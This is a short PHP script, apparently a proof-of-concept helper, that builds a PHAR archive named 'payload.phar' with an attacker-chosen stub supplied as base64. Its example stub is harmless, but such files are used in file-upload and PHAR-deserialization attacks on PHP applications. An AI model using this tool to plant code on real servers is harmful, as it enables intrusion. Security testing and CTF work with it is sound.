<?php

if ($argc == 1) {
    fwrite(STDERR, "[!] No argument for phar_generator.php\n");
    fwrite(STDERR, "[!] Usage : php phar_generator.php base64_payload\n");
    fwrite(STDERR, "[!] Example : php phar_generator.php PD9waHAgZWNobyAicHdkIjsgX19IQUxUX0NPTVBJTEVSKCk7ID8+\n");
    die;
}

// Delete any existing PHAR archive with that name
@unlink("payload.phar");

// Create a new archive
$poc = new Phar("payload.phar");

// Add all write operations to a buffer, without modifying the archive on disk
$poc->startBuffering();

// Set the stub
$poc->setStub(base64_decode($argv[1]));

/* Add a new file in the archive with "text" as its content*/
$poc["file"] = "text";
// Stop buffering and write changes to disk
$poc->stopBuffering();
echo "[+] File created\n"
?>